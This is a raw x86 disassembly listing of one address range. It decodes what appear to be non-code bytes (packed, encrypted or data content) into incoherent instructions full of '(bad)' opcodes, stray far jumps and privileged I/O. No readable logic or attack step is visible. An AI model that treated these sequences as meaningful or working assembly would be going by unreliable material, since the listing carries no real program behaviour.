  4265a2:	pop    ss
  4265a3:	xor    ecx,edi
  4265a5:	and    DWORD PTR [ecx+0x20],esi
  4265a8:	shl    DWORD PTR [edx-0x14be2872],cl
  4265ae:	je     0x426589
  4265b0:	inc    edi
  4265b1:	pop    eax
  4265b2:	outs   dx,DWORD PTR ds:[esi]
  4265b3:	xor    BYTE PTR [ebp+0x2e1071a6],0x6d
  4265ba:	(bad)  
  4265bb:	xor    eax,0xe6694618
  4265c0:	mov    esi,0x6c9a763b
  4265c5:	sbb    al,bh
  4265c7:	mov    eax,0x7b8c0cc7
  4265cc:	adc    esi,DWORD PTR [edx+0x10]
  4265cf:	and    bh,0x4a
  4265d2:	ror    DWORD PTR [ebx+0x38d2dea3],1
  4265d8:	mov    ebx,0x2b066326
  4265dd:	mov    al,ds:0x75c2f4a8
  4265e2:	rcl    DWORD PTR [edx+0x49],0x59
  4265e6:	ror    BYTE PTR [ebp-0x390e12cd],cl
  4265ec:	sbb    DWORD PTR [edx],eax
  4265ee:	mov    eax,0xe25d600e
  4265f3:	icebp  
  4265f4:	pop    eax
  4265f5:	xchg   ebp,eax
  4265f6:	mov    edx,0xf98371cf
  4265fb:	push   ecx
  4265fc:	dec    ebx
  4265fd:	or     dl,BYTE PTR [eax-0x21]
  426600:	out    0x28,al
  426602:	int    0xf6
  426604:	xchg   esp,eax
  426605:	cs arpl cx,cx
  426608:	xchg   BYTE PTR [ebp-0x3107568],dl
  42660e:	and    eax,0xcfc045cb
  426613:	dec    edx
  426614:	(bad)  
  426615:	mov    ecx,0xf0b38e06
  42661a:	jb     0x4265ca
  42661c:	mov    ah,0x82
  42661e:	imul   edi,DWORD PTR [eax+0x0],0x6124f4cf
  426625:	fs test eax,0xd5e7c0f5
  42662b:	mov    cs,WORD PTR [ecx]
  42662d:	lods   eax,DWORD PTR ds:[esi]
  42662e:	mov    ecx,0x9d40d5e
  426634:	repz mov es,WORD PTR gs:[ecx+eax*8+0x30]
  42663a:	sbb    al,0x12
  42663c:	clc    
  42663d:	sbb    dl,cl
  42663f:	cmp    esi,DWORD PTR [eax]
  426641:	push   es
  426642:	dec    ecx
  426643:	or     eax,0x53ebd26
  426648:	daa    
  426649:	lock jmp 0x6f46:0x1213abac
  426651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426652:	mov    bh,0x30
  426654:	jb     0x426674
  426656:	add    esp,DWORD PTR [ebx+0x19d2c3af]
  42665c:	jae    0x42662a
  42665e:	xchg   edx,eax
  42665f:	push   ds
  426660:	xor    eax,0xab70216f
  426665:	sub    eax,0x2089591a
  42666a:	add    eax,0xc6866e8d
  42666f:	arpl   WORD PTR [edi-0x5b29d1f9],bp
  426675:	mov    DWORD PTR [ebx],edi
  426677:	mov    ecx,cs
  426679:	mov    ebx,DWORD PTR [ecx+0x4a]
  42667c:	iret   
  42667d:	cs jmp 0x426658
  426680:	fwait
  426681:	addr16 dec edi
  426683:	push   edx
  426684:	in     al,0x44
  426686:	lea    eax,[edi+ebx*8-0x48]
  42668a:	pop    ss
  42668b:	jbe    0x426660
  42668d:	(bad)
  426690:	sub    ebp,0xc168c4fc
  426696:	jl     0x426682
  426698:	outs   dx,DWORD PTR ds:[esi]
  426699:	(bad)  
  42669a:	mov    ebp,0xeb9cbe89
  42669f:	jecxz  0x4266ee
  4266a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266a2:	das    
  4266a3:	inc    ebx
  4266a4:	inc    esp
  4266a5:	cmp    cl,al
  4266a7:	dec    esp
  4266a8:	lock cmp dh,BYTE PTR [edx]
  4266ab:	mov    al,0x6b
  4266ad:	sbb    ebx,DWORD PTR [ebp+edi*2-0x9]
  4266b1:	inc    ecx
  4266b2:	or     al,0x9f
  4266b4:	dec    edi
  4266b5:	adc    dl,BYTE PTR [esi-0x4]
  4266b8:	bnd jne 0x4266ef
  4266bb:	pop    es
  4266bc:	pop    esp
  4266bd:	lea    eax,[esi+0x328316d8]
  4266c3:	sbb    al,0xaa
  4266c5:	mov    edx,edi
  4266c7:	jp     0x426658
  4266c9:	leave  
  4266ca:	dec    esi
  4266cb:	or     BYTE PTR [eax],bh
  4266cd:	or     al,0x75
  4266cf:	(bad)  
  4266d0:	repnz cmp al,0xc
  4266d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266d4:	sbb    DWORD PTR [esi-0x32],0xffffffa4
  4266d8:	and    ecx,DWORD PTR [esi]
  4266da:	retf   0xe78a
  4266dd:	mov    ch,bl
  4266df:	imul   eax,DWORD PTR [edx],0x3a43b34b
  4266e5:	mov    eax,ds:0x778eaea9
  4266ea:	popa   
  4266eb:	(bad)  
  4266ec:	mov    gs,WORD PTR [ecx]
  4266ee:	push   ss
  4266ef:	pop    edi
  4266f0:	out    dx,eax
  4266f1:	mov    DWORD PTR [edi],eax
  4266f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266f4:	test   eax,0xff3a87fb
  4266f9:	inc    edx
  4266fb:	jo     0x426727
  4266fd:	repnz inc ecx
  4266ff:	mov    bl,0x63
  426701:	xchg   dh,ah
  426703:	(bad)  
  426704:	out    0x83,al
  426706:	lods   eax,DWORD PTR ds:[esi]
  426707:	xor    BYTE PTR [eax-0x61],0x44
  42670b:	mov    dh,0xc
  42670d:	(bad)  
  42670e:	out    dx,al
  42670f:	jmp    0x42670f
  426711:	mov    edx,DWORD PTR [esi+0xd]
  426714:	lock adc BYTE PTR [bp+0x62],bh
  426719:	pop    ss
  42671a:	xchg   ecx,eax
  42671b:	imul   eax,DWORD PTR [eax-0x7766a5cc],0x2
  426722:	and    DWORD PTR [ebp+0x25],esp
  426725:	hlt    
  426726:	sub    BYTE PTR ss:[ebp+0x3e],al
  42672a:	mov    bl,0x76
  42672c:	push   ecx
  42672d:	popf   
  42672e:	push   ebx
  42672f:	adc    esi,DWORD PTR [edx+0x4d]
  426732:	dec    edi
  426733:	inc    ebp
  426734:	jg     0x426776
  426736:	xor    dh,BYTE PTR [edx-0x1d]
  426739:	sar    BYTE PTR ds:0x45920017,0x99
  426740:	shl    DWORD PTR [edi-0x25a7aac1],1
  426746:	jnp    0x426702
  426748:	mov    esp,0xc9bfe78e
  42674d:	outs   dx,BYTE PTR ds:[esi]
  42674e:	sub    esi,esi
  426750:	mov    ecx,0x8715d6d6
  426755:	adc    ebp,esp
  426757:	stos   DWORD PTR es:[edi],eax
  426758:	sbb    eax,0xaf7b653d
  42675d:	mov    ch,0xb8
  42675f:	clc    
  426760:	and    eax,0x52f80e2
  426765:	mov    eax,ds:0xc972739d
  42676a:	add    BYTE PTR [edi],dh
  42676c:	jno    0x4267d0
  42676e:	and    DWORD PTR [edx-0x5731c5cf],edi
  426774:	call   0xb236:0xe01bc26f
  42677b:	sub    eax,0xa8409ef
  426780:	add    ecx,DWORD PTR [edi+0x37926b3f]
  426786:	sbb    DWORD PTR [edi-0x25e20e1d],0x45
  426790:	add    BYTE PTR [eax],al
  426792:	and    DWORD PTR [ecx+ebp*8],0xfbdfed93
  426799:	ss cwde 
  42679b:	in     eax,0x27
  42679d:	inc    esp
  42679e:	stos   BYTE PTR es:[edi],al
  42679f:	mov    esp,0xdfbb9250
  4267a4:	add    DWORD PTR [eax],eax
  4267a6:	repz add al,0x0
  4267a9:	add    BYTE PTR [edx-0xb],al
  4267ac:	xchg   esi,eax
  4267ad:	popa   
  4267ae:	call   0x4c54:0xf291a9a6
  4267b5:	xchg   edx,eax
  4267b6:	pop    ebx
  4267b7:	and    al,0xac
  4267b9:	ins    DWORD PTR es:[edi],dx
  4267ba:	je     0x42679a
  4267bc:	dec    ebx
  4267bd:	fcom   QWORD PTR fs:[edx+0x5b]
  4267c1:	lahf   
  4267c2:	pop    eax
  4267c3:	retf   0xc51c
  4267c6:	ret    0xce77
  4267c9:	shl    ebx,cl
  4267cb:	pushf  
  4267cc:	lods   al,BYTE PTR ds:[esi]
  4267cd:	stc    
  4267ce:	push   ecx
  4267cf:	pop    es
  4267d0:	aad    0xa0
  4267d2:	std    
  4267d3:	ror    DWORD PTR [edx-0x7f89ee50],cl
  4267d9:	daa    
  4267da:	mov    bh,0x1a
  4267dc:	stos   DWORD PTR es:[edi],eax
  4267dd:	rol    ecx,1
  4267df:	pop    edi
  4267e0:	jne    0x42680a
  4267e2:	call   0xd8d8a848
  4267e7:	xchg   esi,eax
  4267e8:	call   0xca5c:0x689db519
  4267ef:	xchg   ebp,eax
  4267f0:	inc    ecx
  4267f1:	and    BYTE PTR [ebp+0x72],0x56
  4267f5:	stos   DWORD PTR es:[edi],eax
  4267f6:	das    
  4267f7:	iret   
  4267f8:	cmp    al,0xf6
  4267fa:	in     eax,0x9a
  4267fc:	push   edx
  4267fd:	scas   eax,DWORD PTR es:[edi]
  4267fe:	or     eax,0xf9ec6d76
  426803:	call   0xf3dc69f1
  426808:	dec    ebx
  426809:	mov    ch,0xb4
  42680b:	jge    0x42685d
  42680d:	es addr16 imul ebp,eax,0x6407326f
  426815:	pop    ss
  426816:	pop    edx
  426817:	xor    bh,bl
  426819:	push   es
  42681a:	aas    
  42681b:	out    0x33,eax
  42681d:	lahf   
  42681e:	jno    0x4267e7
  426820:	loopne 0x426872
  426822:	push   edx
  426823:	iret   
  426824:	das    
  426825:	mov    dl,0x54
  426827:	inc    esp
  426828:	(bad)  
  42682a:	or     BYTE PTR [ebp+0x7d33dec],0x2e
  426831:	pop    esp
  426832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426833:	mov    esp,0x16f38f3c
  426838:	push   cs
  426839:	imul   ecx,DWORD PTR [edi-0x46],0xffffff8a
  42683d:	or     DWORD PTR [eax],edi
  42683f:	dec    esp
  426840:	outs   dx,DWORD PTR ds:[esi]
  426841:	(bad)  
  426842:	cmp    dl,BYTE PTR [edx+eax*2+0x42]
  426846:	cmp    bh,BYTE PTR [edx-0x3a6bed07]
  42684c:	rcr    BYTE PTR [ebx+0x7a2e554e],1
  426852:	sbb    al,BYTE PTR [eax-0x36]
  426855:	pusha  
  426856:	shl    esp,0x45
  426859:	cdq    
  42685a:	mov    al,ds:0x824d6970
  42685f:	add    cl,BYTE PTR ds:0xec77563
  426865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426866:	or     al,BYTE PTR [ebx+eiz*4-0x868484]
  42686d:	jmp    0x4268bb
  42686f:	jno    0x4268b5
  426871:	xchg   ebp,eax
  426872:	pop    ecx
  426873:	call   0x4f05:0x8f182ebe
  42687a:	imul   eax,ebx,0x29
  42687d:	rcl    DWORD PTR [esi-0x67594cc0],0xe2
  426884:	jbe    0x4268e6
  426886:	and    al,BYTE PTR [edi]
  426888:	out    0x55,al
  42688a:	add    ebp,eax
  42688c:	push   edx
  42688d:	ds ja  0x426887
  426890:	lods   eax,DWORD PTR ds:[esi]
  426891:	fwait
  426892:	dec    edx
  426893:	jno    0x426841
  426895:	or     al,0xad
  426897:	mov    bh,0x5a
  426899:	adc    bl,BYTE PTR [eax]
  42689b:	mov    BYTE PTR [edi+esi*2+0x68e9445b],bl
  4268a2:	outs   dx,BYTE PTR ds:[esi]
  4268a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268a4:	push   ebp
  4268a5:	cmp    eax,0x823d9625
  4268aa:	sbb    dl,bh
  4268ac:	sbb    eax,0xbf8bd16
  4268b1:	bound  ebx,QWORD PTR [esi]
  4268b3:	xchg   ebp,eax
  4268b4:	fs in  al,0xaa
  4268b7:	sbb    BYTE PTR [edi-0x129bde8d],0xf0
  4268be:	shl    ebp,1
  4268c0:	aam    0x46
  4268c2:	add    bh,BYTE PTR [edi-0x68a7dffc]
  4268c8:	mov    ecx,0x22ed4d31
  4268cd:	cwde   
  4268ce:	add    al,0x46
  4268d0:	out    dx,al
  4268d1:	(bad)  
  4268d2:	mov    ds:0x4e580fed,al
  4268d7:	jmp    DWORD PTR ds:0xa1399031
  4268dd:	js     0x4268bf
  4268df:	inc    edi
  4268e0:	inc    ebx
  4268e1:	xchg   ebx,eax
  4268e2:	sahf   
  4268e3:	xor    ah,cl
  4268e5:	push   es
  4268e6:	je     0x426941
  4268e8:	sub    al,0xe4
  4268ea:	mov    esp,0x84a09866
  4268ef:	inc    ebx
  4268f0:	pop    es
  4268f1:	jbe    0x4268e7
  4268f3:	imul   ebx,DWORD PTR [ebp-0x44977ab],0xffffffbe
  4268fa:	sbb    cl,dh
  4268fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268fd:	adc    dh,BYTE PTR [edx-0x47]
  426900:	jbe    0x426972
  426902:	fadd   QWORD PTR [edx-0x3b7668a5]
  426908:	inc    eax
  426909:	xchg   BYTE PTR [ebp-0x1a],al
  42690c:	xor    edx,esp
  42690e:	aad    0x64
  426910:	mov    cl,0x8f
  426912:	push   cs
  426913:	push   edi
  426914:	popf   
  426915:	dec    ecx
  426916:	lock gs xchg ebx,eax
  426919:	mov    DWORD PTR [esi-0x5fb304c0],ecx
  42691f:	mov    ebx,0x1e86c4c
  426924:	test   eax,0x3a81b992
  426929:	xchg   DWORD PTR [esi],edi
  42692b:	adc    al,0xb8
  42692d:	sahf   
  42692e:	mov    ecx,0x6a18937
  426933:	mov    esp,0xa0435214
  426938:	mov    bl,BYTE PTR [bx]
  42693b:	imul   ebx,ebx,0x27
  42693e:	mov    bh,0x6c
  426940:	test   DWORD PTR [ebp+0x1c],ebx
  426943:	(bad)  
  426944:	sar    dl,cl
  426946:	dec    ecx
  426947:	retf   
  426948:	inc    esp
  426949:	jbe    0x426990
  42694b:	push   0xc
  42694d:	retf   
  42694e:	mov    al,0x7
  426950:	jns    0x4268ed
  426952:	cli    
  426953:	pop    ss
  426954:	retf   
  426955:	sub    bh,BYTE PTR [ebx]
  426957:	in     eax,dx
  426958:	sbb    eax,0x96d09784
  42695d:	dec    esp
  42695e:	pusha  
  42695f:	dec    esp
  426960:	or     ch,ah
  426962:	test   BYTE PTR [esi-0x37],cl
  426965:	push   ds
  426966:	inc    eax
  426967:	repnz shr DWORD PTR [eax+0x58],0x5a
  42696c:	clc    
  42696d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42696e:	or     DWORD PTR [ecx+0x31],0xffffff9d
  426972:	(bad)  
  426974:	shl    BYTE PTR [eax],1
  426976:	jmp    0xcf2e528d
  42697b:	jmp    0xdb4f:0x4ff922a6
  426982:	mov    dh,0x52
  426984:	test   bl,0x6b
  426987:	mov    ?,ebx
  426989:	bound  ecx,QWORD PTR [edx+0x1f]
  42698c:	or     eax,0xa2d6fc92
  426991:	sub    ebp,DWORD PTR [ebp-0x3d]
  426994:	cld    
  426995:	cmp    bl,bh
  426997:	mov    bl,0xa1
  426999:	cmp    eax,0x88c83cb
  42699e:	cmp    BYTE PTR [esi+0x4496d1d2],0x9a
  4269a5:	shl    DWORD PTR [edx+0x2],0x4c
  4269a9:	sub    edx,ebx
  4269ab:	fistp  DWORD PTR [ebx]
  4269ad:	xchg   DWORD PTR [eax+edx*4-0x4487c0a9],ecx
  4269b4:	sbb    al,0xfa
  4269b6:	xchg   ecx,eax
  4269b7:	cmp    eax,0x82dd4c74
  4269bc:	ins    DWORD PTR es:[edi],dx
  4269bd:	jmp    0x548ed507
  4269c2:	pop    ebx
  4269c3:	imul   esp,DWORD PTR [ebx+0x22d25831],0x68
  4269ca:	test   eax,0x178e3448
  4269cf:	pop    esi
  4269d0:	out    dx,eax
  4269d1:	cmp    DWORD PTR [eax+edi*2],eax
  4269d4:	mov    dl,0x2a
  4269d6:	and    DWORD PTR [esi+0x603e6c5f],esp
  4269dc:	inc    esp
  4269dd:	mov    ch,0xdd
  4269df:	mov    eax,0xa5e9a7ab
  4269e4:	jnp    0x426a26
  4269e6:	icebp  
  4269e7:	add    al,BYTE PTR [edx+ecx*4]
  4269ea:	imul   ecx
  4269ec:	dec    BYTE PTR [eax-0x7e6ee73f]
  4269f2:	add    al,cl
  4269f4:	shl    DWORD PTR [ebx+0x18092787],0xda
  4269fb:	sub    ch,BYTE PTR [ecx+0x38]
  4269fe:	add    eax,0xbfebe3db
  426a03:	and    esp,DWORD PTR [edx+0x65a9ce7c]
  426a09:	fdivr  QWORD PTR [edi+ebp*2+0x51]
  426a0d:	ds stos BYTE PTR es:[edi],al
  426a0f:	imul   ebp,DWORD PTR [ebx],0x4ae73242
  426a15:	mov    ah,0x9b
  426a17:	dec    ebp
  426a18:	inc    esp
  426a19:	mov    ecx,0x12f7a194
  426a1e:	sbb    ch,BYTE PTR [ecx+0x34]
  426a21:	and    edx,DWORD PTR [eax+eax*8-0x197bbd61]
  426a28:	cwde   
  426a29:	pop    edx
  426a2a:	mov    al,BYTE PTR [eax]
  426a2c:	test   BYTE PTR [ebx-0x36b36916],0xde
  426a33:	dec    edx
  426a34:	ins    DWORD PTR es:[edi],dx
  426a35:	xlat   BYTE PTR ds:[ebx]
  426a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a37:	repz test BYTE PTR [ebx+0x6f3a9b39],cl
  426a3e:	sahf   
  426a3f:	imul   ebx,esi,0x3f97fde1
  426a45:	enter  0xcb91,0x7d
  426a49:	push   0x22
  426a4b:	lahf   
  426a4c:	(bad)  
  426a4e:	jg     0x426a8a
  426a50:	fisubr WORD PTR [edi]
  426a52:	dec    ebp
  426a53:	stc    
  426a54:	dec    DWORD PTR [edx-0x28]
  426a57:	pushf  
  426a58:	je     0x426aa4
  426a5a:	ror    dl,0xf7
  426a5d:	add    DWORD PTR [ebp-0x38],0x87a26dce
  426a64:	or     ecx,DWORD PTR [esi+0x688ee503]
  426a6a:	mov    esp,0x1b51ea
  426a6f:	xchg   esp,ecx
  426a71:	lods   al,BYTE PTR ds:[esi]
  426a72:	mov    edx,0x502576e2
  426a77:	sub    cl,BYTE PTR [edx-0x15]
  426a7a:	rcl    DWORD PTR [eax+0x720003a],0xc6
  426a81:	sub    al,0xa
  426a83:	xor    DWORD PTR [ecx-0x24],esi
  426a86:	cld    
  426a87:	xchg   dl,dl
  426a89:	lods   al,BYTE PTR ds:[esi]
  426a8a:	sahf   
  426a8b:	dec    esi
  426a8c:	and    eax,0xd675fa49
  426a91:	es and eax,0x87f262b7
  426a97:	leave  
  426a98:	pop    ss
  426a99:	ja     0x426a7b
  426a9b:	mov    DWORD PTR [edi+ebx*8],edx
  426a9e:	mov    WORD PTR [eax+eax*2],bx
  426aa2:	ja     0x426ae5
  426aa4:	sahf   
  426aa5:	popa   
  426aa6:	loop   0x426a3b
  426aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426aa9:	mov    al,0x53
  426aab:	pushf  
  426aac:	inc    ecx
  426aad:	push   cs
  426aae:	pop    esi
  426aaf:	or     DWORD PTR [ebx],ecx
  426ab1:	fst    QWORD PTR es:[esi-0x72ad1e39]
  426ab8:	fwait
  426ab9:	xchg   edx,eax
  426aba:	xor    DWORD PTR [esi+eax*8],0x42b7a353
  426ac1:	xor    DWORD PTR [esi-0x2de117bf],esp
  426ac7:	test   BYTE PTR [ecx+ecx*8],0xb1
  426acb:	dec    edi
  426acc:	cmp    bh,BYTE PTR [eax-0x1c]
  426acf:	inc    edx
  426ad0:	in     eax,dx
  426ad1:	or     DWORD PTR [edi-0x7d4d51a6],eax
  426ad7:	es dec ebp
  426ad9:	ja     0x426ab2
  426adb:	les    esi,FWORD PTR [ebx-0x5f]
  426ade:	in     al,dx
  426adf:	jmp    0x80b24e4f
  426ae4:	mov    DWORD PTR [eax],ecx
  426ae6:	mov    ecx,DWORD PTR [esi-0x5b]
  426ae9:	and    edi,esp
  426aeb:	fsubr  QWORD PTR [eax-0x3c7e2aaa]
  426af1:	sub    cl,0x63
  426af4:	outs   dx,BYTE PTR ds:[esi]
  426af5:	fild   QWORD PTR [ecx+0x8]
  426af8:	test   eax,0x23b3ffe4
  426afd:	test   eax,0xa6ce3376
  426b02:	pop    ds
  426b03:	push   ebp
  426b04:	sub    DWORD PTR [edx-0x3fa36bf8],0xffffffe6
  426b0b:	sub    eax,0x126ce44
  426b10:	xor    edx,DWORD PTR ds:0x5b4b9fee
  426b16:	call   0x6088:0xf41a8974
  426b1d:	ret    
  426b1e:	jmp    FWORD PTR es:[ebp-0x71e1e936]
  426b25:	jp     0x426b6e
  426b27:	mov    ah,0xd0
  426b29:	mov    al,0xb7
  426b2b:	inc    ebp
  426b2c:	ret    0xa151
  426b2f:	ss (bad) 
  426b32:	or     eax,DWORD PTR [esi-0x17984e56]
  426b38:	aaa    
  426b39:	mul    BYTE PTR [ebx+0x3]
  426b3c:	(bad)  
  426b3d:	retf   0x98a2
  426b40:	mov    eax,0x3afdbbad
  426b45:	xor    dh,bl
  426b47:	hlt    
  426b48:	popa   
  426b49:	inc    ecx
  426b4a:	pop    eax
  426b4b:	lock cmp DWORD PTR [ebx-0x2ed27703],edi
  426b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b53:	cmp    al,0xe0
  426b55:	jo     0x426b87
  426b57:	outs   dx,BYTE PTR ds:[esi]
  426b58:	jmp    0xc5f5:0x702898e2
  426b5f:	in     al,dx
  426b60:	dec    ebp
  426b61:	add    BYTE PTR [ebx+0x19c2da8c],ch
  426b67:	(bad)  
  426b69:	jo     0x426af7
  426b6b:	jecxz  0x426be0
  426b6d:	(bad)  
  426b6e:	repz push 0xffffff92
  426b71:	in     al,0x19
  426b73:	mov    ebp,?
  426b75:	push   esp
  426b76:	mov    bh,0xff
  426b78:	mov    al,ds:0x56e83957
  426b7d:	dec    DWORD PTR [esi-0x604bcc87]
  426b83:	push   cs
  426b84:	lea    eax,[edi-0x3]
  426b87:	xchg   BYTE PTR [ebx-0x24fbb873],dh
  426b8d:	sahf   
  426b8e:	in     al,0x8c
  426b90:	(bad)  
  426b91:	in     eax,0x38
  426b93:	pushf  
  426b94:	lea    ebx,[edi+edx*1-0x8]
  426b98:	mov    ecx,0x5eb24149
  426b9d:	inc    bh
  426b9f:	or     DWORD PTR [edi],edx
  426ba1:	xor    eax,0x291f09ee
  426ba6:	in     al,dx
  426ba7:	mov    cl,0xd9
  426ba9:	xchg   esi,eax
  426baa:	les    eax,FWORD PTR [ebx+0xd]
  426bad:	inc    edi
  426bae:	lea    ecx,[edi+0x5f]
  426bb1:	arpl   WORD PTR [ebx],cx
  426bb3:	test   eax,0xcf3282b2
  426bb8:	(bad)  
  426bba:	test   BYTE PTR [ebx+0x4a],al
  426bbd:	es je  0x426bf4
  426bc0:	loope  0x426c2c
  426bc2:	xchg   ecx,eax
  426bc3:	mov    ds:0x7c5a8775,eax
  426bc8:	frstor [edx+0x3]
  426bcb:	xchg   esi,eax
  426bcc:	sbb    eax,0x463a472b
  426bd1:	mov    BYTE PTR [edx-0x5b],bl
  426bd4:	(bad)  
  426bd6:	lds    eax,FWORD PTR [ebx-0x740b10ce]
  426bdc:	outs   dx,DWORD PTR ds:[esi]
  426bdd:	mov    edx,0x24ffd4cd
  426be2:	jno    0x426bed
  426be4:	xchg   BYTE PTR [edx+0x7c],ah
  426be7:	xor    al,0xf
  426be9:	test   al,0x52
  426beb:	imul   ecx,DWORD PTR [edx+0x3f],0xffffffcc
  426bef:	sahf   
  426bf0:	add    ch,dl
  426bf2:	(bad)  
  426bf3:	fnstenv ds:0xb092d12d
  426bf9:	push   0x75
  426bfb:	xor    BYTE PTR [ecx+0x65956a5a],cl
  426c01:	inc    esp
  426c02:	mov    ds:0xd250667b,eax
  426c07:	add    ch,BYTE PTR [ebp-0x5f]
  426c0a:	mov    esi,0x367cd1a9
  426c0f:	std    
  426c10:	push   ss
  426c11:	add    edx,DWORD PTR [edx+0x1]
  426c14:	enter  0xe17b,0x5b
  426c18:	(bad)  
  426c19:	in     al,0xb0
  426c1b:	loop   0x426c06
  426c1d:	lock fild QWORD PTR [ebx]
  426c20:	int    0xd7
  426c22:	and    al,0xe1
  426c24:	push   eax
  426c25:	sbb    bl,dl
  426c27:	and    bh,dh
  426c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c2a:	push   ebx
  426c2b:	div    ebp
  426c2d:	adc    al,0xf9
  426c2f:	pop    ss
  426c30:	test   BYTE PTR [edx-0x5364c42a],cl
  426c36:	nop
  426c37:	mov    BYTE PTR [edi+0x2b],ch
  426c3a:	or     DWORD PTR [esi],edi
  426c3c:	stos   DWORD PTR es:[edi],eax
  426c3d:	fistp  WORD PTR [edi]
  426c3f:	mov    eax,0x3f16c820
  426c44:	xchg   edx,eax
  426c45:	inc    esi
  426c46:	aam    0xae
  426c48:	sub    ecx,DWORD PTR [edi+0x10e8404b]
  426c4e:	mov    BYTE PTR [ebx+0x62a15544],ch
  426c54:	ss mov ah,0x53
  426c57:	xchg   edi,eax
  426c58:	or     al,0xd7
  426c5a:	push   0x67
  426c5c:	dec    esp
  426c5d:	aam    0xc9
  426c5f:	out    dx,al
  426c60:	mov    esi,0xca59a9da
  426c65:	data16 cmp WORD PTR [edi+0x34],cx
  426c6a:	test   BYTE PTR [edi],0x2a
  426c6d:	xchg   ebx,eax
  426c6e:	cdq    
  426c6f:	add    edi,esp
  426c71:	add    eax,0xc97f4061
  426c76:	jns    0x426bfc
  426c78:	cs loopne 0x426ce1
  426c7b:	pusha  
  426c7c:	loopne 0x426c59
  426c7e:	and    DWORD PTR [ecx],eax
  426c80:	adc    BYTE PTR [eax+esi*1-0x26],al
  426c84:	sbb    dl,BYTE PTR [ebx+0x366c1ac2]
  426c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c8b:	dec    esp
  426c8c:	xor    DWORD PTR [edi+eiz*2],ebp
  426c8f:	xchg   ebp,eax
  426c90:	mov    cl,0xf8
  426c92:	mov    dh,bl
  426c94:	push   ss
  426c95:	xchg   esi,eax
  426c96:	mov    eax,0x69a228d
  426c9b:	jle    0x426ca6
  426c9d:	add    BYTE PTR [eax],al
  426c9f:	add    BYTE PTR [eax],al
  426ca1:	add    BYTE PTR [esi+0x5f451fc0],dl
  426ca7:	(bad)  
  426ca9:	rol    DWORD PTR [ebx+0x22e88e10],cl
  426caf:	sub    al,0xba
  426cb1:	fild   QWORD PTR [esi-0xcfffe1c]
  426cb7:	add    al,0x0
  426cb9:	add    dh,bh
  426cbb:	cld    
  426cbc:	ds scas eax,DWORD PTR es:[edi]
  426cbe:	mov    bl,0xa
  426cc0:	pushf  
  426cc1:	cmp    eax,edx
  426cc3:	pslld  mm7,QWORD PTR [eax+0x6b]
  426cc7:	lock jbe 0x426d35
  426cca:	test   al,0x9a
  426ccc:	dec    edx
  426ccd:	add    DWORD PTR ds:0x8a6f892a,esi
  426cd3:	dec    ecx
  426cd4:	jbe    0x426cd6
  426cd6:	aaa    
  426cd7:	leave  
  426cd8:	ret    0xe52d
  426cdb:	pushf  
  426cdc:	jmp    FWORD PTR [edx-0x6d743b81]
  426ce2:	test   al,0x8f
  426ce4:	fld    QWORD PTR [ecx-0x7a]
  426ce7:	rcr    BYTE PTR [edx+0x5e3c81a5],cl
  426ced:	cmp    DWORD PTR [ebx],ebx
  426cef:	mov    esi,DWORD PTR [edx+0x7eaca612]
  426cf5:	push   esp
  426cf6:	ret    0x2e11
  426cf9:	fstp   QWORD PTR [bp+di+0xe0]
  426cfe:	test   eax,0xd396c8d5
  426d03:	jle    0x426d5b
  426d05:	cmc    
  426d06:	adc    eax,0x6dcb68a6
  426d0b:	adc    ah,BYTE PTR [ebx-0x5f]
  426d0e:	add    bh,BYTE PTR [edi]
  426d10:	scas   eax,DWORD PTR es:[edi]
  426d11:	xchg   edx,eax
  426d12:	test   BYTE PTR [ebp+0x4a],bh
  426d15:	outs   dx,DWORD PTR ds:[esi]
  426d16:	addr16 jo 0x426d5a
  426d19:	xchg   BYTE PTR [ebp-0x4b],al
  426d1c:	push   cs
  426d1d:	(bad)  
  426d1e:	pop    edx
  426d1f:	mov    esi,0x550bfb85
  426d24:	aad    0x52
  426d26:	and    al,0x3c
  426d28:	mov    ebx,0x166bb149
  426d2d:	jle    0x426d18
  426d2f:	(bad)  
  426d30:	cmp    eax,0xe278d24b
  426d35:	add    BYTE PTR [eax+0x5d938eb6],bh
  426d3b:	push   esi
  426d3c:	rcr    BYTE PTR [eax+edi*1],1
  426d3f:	(bad)
  426d43:	jecxz  0x426d02
  426d45:	mov    ds:0x9cb50137,eax
  426d4a:	sbb    eax,0x793ce888
  426d4f:	stos   DWORD PTR es:[edi],eax
  426d50:	loope  0x426d3d
  426d52:	(bad)  
  426d53:	loop   0x426d7c
  426d55:	sub    cl,BYTE PTR [edi-0x406dd021]
  426d5b:	out    0xe9,al
  426d5d:	dec    esp
  426d5e:	xchg   esi,eax
  426d5f:	mov    gs,eax
  426d61:	retf   0xa574
  426d64:	into   
  426d65:	ds cdq 
  426d67:	lds    ebp,FWORD PTR [ebx-0x4638bd16]
  426d6d:	sbb    DWORD PTR [edx-0x70f7b81d],0xa5e0b6d9
  426d77:	imul   ecx,DWORD PTR [ebx],0xfffffff7
  426d7a:	mov    esp,esp
  426d7c:	cdq    
  426d7d:	lock xor eax,0xe61d3321
  426d83:	mov    eax,0x49897853
  426d88:	lds    ebx,FWORD PTR [ebx+ecx*4-0x12]
  426d8c:	mov    ah,BYTE PTR [ebx]
  426d8e:	xor    ah,BYTE PTR [ecx-0x65]
  426d91:	push   edi
  426d92:	fdivr  st,st(1)
  426d94:	pushf  
  426d95:	pop    edi
  426d96:	mov    eax,0x776e9370
  426d9b:	sub    dl,dh
  426d9d:	aaa    
  426d9e:	mov    al,ds:0x9e7ca798
  426da3:	fild   WORD PTR [eax+0x37]
  426da6:	mov    bh,0x63
  426da8:	lea    ebp,[ebx+0xe0c56db]
  426dae:	test   eax,0x671e49b4
  426db3:	jns    0x426d7f
